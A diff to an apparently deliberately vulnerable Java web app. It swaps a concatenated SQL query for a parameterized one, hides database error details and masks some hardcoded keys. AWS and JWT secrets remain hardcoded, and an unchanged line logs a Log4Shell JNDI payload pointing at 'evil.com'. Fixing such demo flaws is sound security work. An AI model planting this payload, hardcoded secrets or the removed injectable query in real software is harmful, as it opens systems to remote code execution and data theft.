@@ -17,11 +17,11 @@ public class App {
    // 🔐 Hardcoded secrets
 private static final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE3FWQ";
 private static final String AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY+9sX2pQ";
-private static final String DB_PASSWORD = "Xy9#mK2$vL8@nP4!qR7&wZ1^jF5*hD3";
+private static final String DB_PASSWORD = "*****hD3";
 private static final String JWT_SECRET = "HS256.k9P#mN2$vQ8@xL4!rW7&yZ1^jB5*hD3tF6+sG0/nK";
-private static final String API_KEY = "sk-prod-4xK9mN2pQ8rL4vW7yZ1jB5hD3tF6sG0nK2xP8mQ4rL7vW";
-private static final String GITHUB_TOKEN = "ghp_4xK9mN2pQ8rL4vW7yZ1jB5hD3tF6sG0nK2x";
-private static final String STRIPE_KEY = "sk_live_4xK9mN2pQ8rL4vW7yZ1jB5hD3tF6sG0nK2xP8mQ4rL7vWyZ";
+private static final String API_KEY = "****L7vW";
+private static final String GITHUB_TOKEN = "****nK2x";
+private static final String STRIPE_KEY = "****vWyZ";
 
     private static final Logger logger = LogManager.getLogger(App.class);
 
@@ -37,25 +37,29 @@ private static final String STRIPE_KEY = "sk_live_4xK9mN2pQ8rL4vW7yZ1jB5hD3tF6sG
         System.out.println("Vulnerable app running on http://localhost:8080");
     }
 
-    // 🛑 SQL Injection
+    // ✅ SQL Injection Fixed - Using PreparedStatement with parameterized query
     static class UserHandler implements HttpHandler {
         public void handle(HttpExchange exchange) throws IOException {
             String query = exchange.getRequestURI().getQuery();
             String username = query != null ? query.replace("username=", "") : "guest";
 
-            try {
-                Connection conn = DriverManager.getConnection(
+            try (Connection conn = DriverManager.getConnection(
                     "jdbc:mysql://localhost:3306/mydb", "root", DB_PASSWORD
                 );
-                // Vulnerable: user input directly in SQL query
-                Statement stmt = conn.createStatement();
-                ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE username = '" + username + "'");
+                // Fixed: Using PreparedStatement with parameterized query to prevent SQL injection
+                PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?")) {
+                
+                // Bind the username parameter safely
+                stmt.setString(1, username);
+                ResultSet rs = stmt.executeQuery();
 
                 logger.info("User lookup: ${jndi:ldap://evil.com/a}"); // Log4Shell bait
 
                 sendResponse(exchange, "Query executed for: " + username);
             } catch (Exception e) {
-                sendResponse(exchange, "DB error: " + e.getMessage());
+                // Fixed: Do not expose detailed database error messages to client
+                logger.error("Database error during user lookup", e);
+                sendResponse(exchange, "An error occurred while processing your request");
             }
         }
     }
